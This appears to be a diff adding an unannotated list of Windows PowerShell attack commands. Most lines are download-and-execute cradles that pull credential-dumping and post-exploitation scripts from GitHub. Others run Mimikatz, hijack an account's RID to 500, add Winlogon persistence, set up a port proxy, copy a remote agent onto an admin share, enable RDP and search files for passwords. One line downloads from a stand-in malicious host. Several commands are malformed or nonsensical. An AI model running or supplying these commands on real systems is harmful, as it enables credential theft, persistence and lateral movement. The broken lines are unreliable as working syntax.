@@ -1,0 +1,35 @@
+Invoke-CredentialPhisting -DomainName 'demo' -UserName 'administrator' -Password 'Password1'
+Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fleschutz/PowerShell/main/scripts/check-admin.ps1')"
+Invoke-Expression -Command 'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1")'
+Invoke-Command -ComputerName unina -ScriptBlock { whoami }
+powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-Mimikatz"
+Get-CimInstance -Class Win32_Process | Export-Csv c:\temp\results.csv -NoTypeInformation
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5775/WinPwn.ps1')"
+Invoke-RIDHijacking -User unina -RID 500
+powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-Mimikatz"
+Invoke-Expression -Command 'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1")'
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command "& {Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/WINspect.ps1')}"
+Get-BrowserInformation -Browser All -Datatype History -UserName Alice -SearchStrings 'twitter'
+powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fleschutz/PowerShell/main/scripts/check-admin.ps1')"
+Get-CimInstance -class Win32_Group
+Get-Date -Format ${CurrentDate}
+$payload = [System.Text.Encoding]::Unicode.GetBytes("Invoke-Mimikatz -DumpCreds")
+powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-Mimikatz"
+Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/credential.ps1')"
+Get-CimInstance -class Win32_UserAccount
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest https://raw.githubusercontent.com/Whitecat18/Powershell-Scripts-for-Hackers-and-Pentesters/main/scripts/all_in_one_enum.ps1 -OutFile hello.ps1; .\hello.ps1"
+Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, ${bin_to_execute}" -Force
+Get-ChildItem -Path ${folder} -Recurse | % { $_.Content }
+gci HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name 'password' -Value '*$'
+nbtstat -A ${remote.host.fqdn} -D ${local.user.name} -p ${local.user.password}
+Get-DomainGPOLocalGroup | select GPODisplayName , ContainerName , ComputerName
+netsh interface portproxy add v4tov4 listenport=5446 connectport=5985 connectaddress=10.35.8.23
+gci C:\Users\unina\Desktop -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"
+C:\Windows\System32\inetsrv\appcmd.exe list /host:10.10.1.0 /domain:subnet /dontHost:true
+$imewdbled = New-Object Net.WebClient; $imewdbled.DownloadString('http://malicious-site.com/malicious-code')
+Get-ATHDataStream | Select-Object -Property ProcessName, Id, message.txt
+[System.Security.Principal.WindowsPrincipal]::GetCurrent() | % { $_.Security.Principal.WindowsIdentity::GetCurrent() }
+$path = "sandcat.go-windows"; ; $drive = "\\${remote.host.fqdn}\C$"; ; Copy-Item -v -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
+Get-ForestGlobalCatalog -Forest external
+$code = 'Get-Process'; Invoke-Expression $code
+(Get-CimInstance -Class "Win32_TerminalServiceSetting" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)
